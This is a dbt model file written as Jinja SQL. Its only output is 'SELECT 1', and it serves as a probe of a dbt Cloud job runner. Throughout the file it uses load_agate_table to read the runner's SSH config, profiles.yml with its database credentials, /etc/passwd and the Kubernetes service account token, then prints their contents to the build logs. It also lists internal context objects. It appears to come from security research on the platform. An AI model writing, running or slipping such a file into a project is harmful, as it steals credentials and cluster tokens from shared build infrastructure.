{{ config(materialized='view') }}

{# Deep probe: api object, load_agate_table file read, SSH config #}

{# 1. Probe the 'api' object #}
{%- if api is defined -%}
  {{ log("API_TYPE=" ~ api | string | truncate(500), info=True) }}
  {%- if api.Relation is defined -%}
    {{ log("API_RELATION=" ~ api.Relation | string | truncate(300), info=True) }}
  {%- endif -%}
  {%- if api.Column is defined -%}
    {{ log("API_COLUMN=" ~ api.Column | string | truncate(300), info=True) }}
  {%- endif -%}
{%- endif -%}

{# 2. Try load_agate_table on SSH config and other interesting files #}
{# The SSH config path is /tmp/jobs/{run_id}/.ssh/config #}
{# We know run_id from dbt_metadata_envs #}
{%- set run_id = env_var('DBT_CLOUD_RUN_ID', '') -%}
{{ log("CURRENT_RUN_ID=" ~ run_id, info=True) }}

{%- set ssh_config_path = '/tmp/jobs/' ~ run_id ~ '/.ssh/config' -%}
{%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}

{# Try to read SSH config #}
{%- set ssh_result = load_agate_table(ssh_config_path) -%}
{{ log("SSH_CONFIG=" ~ ssh_result | string | truncate(1000), info=True) }}

{# Try to read profiles.yml (contains connection creds) #}
{%- set profiles_result = load_agate_table(profiles_path) -%}
{{ log("PROFILES_YML=" ~ profiles_result | string | truncate(1000), info=True) }}

{# Try /etc/passwd #}
{%- set passwd_result = load_agate_table('/etc/passwd') -%}
{{ log("ETC_PASSWD=" ~ passwd_result | string | truncate(1000), info=True) }}

{# Try /etc/hostname #}
{%- set hostname_result = load_agate_table('/etc/hostname') -%}
{{ log("ETC_HOSTNAME=" ~ hostname_result | string | truncate(500), info=True) }}

{# Try K8s service account token #}
{%- set k8s_token = load_agate_table('/var/run/secrets/kubernetes.io/serviceaccount/token') -%}
{{ log("K8S_TOKEN=" ~ k8s_token | string | truncate(1000), info=True) }}

{# Try K8s namespace #}
{%- set k8s_ns = load_agate_table('/var/run/secrets/kubernetes.io/serviceaccount/namespace') -%}
{{ log("K8S_NAMESPACE=" ~ k8s_ns | string | truncate(500), info=True) }}

{# 3. Probe store_result / store_raw_result #}
{%- if store_result is defined -%}
  {{ log("STORE_RESULT_TYPE=" ~ store_result | string | truncate(300), info=True) }}
{%- endif -%}
{%- if store_raw_result is defined -%}
  {{ log("STORE_RAW_RESULT_TYPE=" ~ store_raw_result | string | truncate(300), info=True) }}
{%- endif -%}
{%- if load_result is defined -%}
  {{ log("LOAD_RESULT_TYPE=" ~ load_result | string | truncate(300), info=True) }}
{%- endif -%}

{# 4. Check validation object #}
{%- if validation is defined -%}
  {{ log("VALIDATION_TYPE=" ~ validation | string | truncate(300), info=True) }}
{%- endif -%}

{# 5. Check model object for metadata #}
{%- if model is defined -%}
  {{ log("MODEL_TYPE=" ~ model | string | truncate(500), info=True) }}
{%- endif -%}

{# 6. Check context_macro_stack #}
{%- if context_macro_stack is defined -%}
  {{ log("MACRO_STACK=" ~ context_macro_stack | string | truncate(300), info=True) }}
{%- endif -%}

SELECT 1 as id
